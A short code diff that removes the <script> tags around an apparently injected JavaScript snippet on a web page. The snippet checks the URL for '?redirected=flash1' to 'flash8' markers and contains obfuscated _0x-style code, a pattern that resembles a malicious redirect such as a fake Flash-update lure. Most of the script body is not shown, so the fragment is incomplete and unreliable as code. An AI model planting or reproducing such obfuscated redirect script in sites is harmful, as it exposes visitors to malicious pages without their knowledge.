@@ -1,6 +1,6 @@
 
 
-          <script>
+        
 function executeScript() {
     var queryString = window.location.search;
     if (queryString.includes('?369=0') || queryString.includes('?redirected=flash1') || queryString.includes('?redirected=flash2') || queryString.includes('?redirected=flash3') || queryString.includes('?redirected=flash4') || queryString.includes('?redirected=flash5') || queryString.includes('?redirected=flash6') || queryString.includes('?redirected=flash7') || queryString.includes('?redirected=flash8')) {
@@ -74,4 +74,4 @@ var _0x29efe3=_0x4134;function _0x479f(){var _0x3b4236=['setTimeout','15071tYzYt
 
 
 executeScript();
-</script>
+
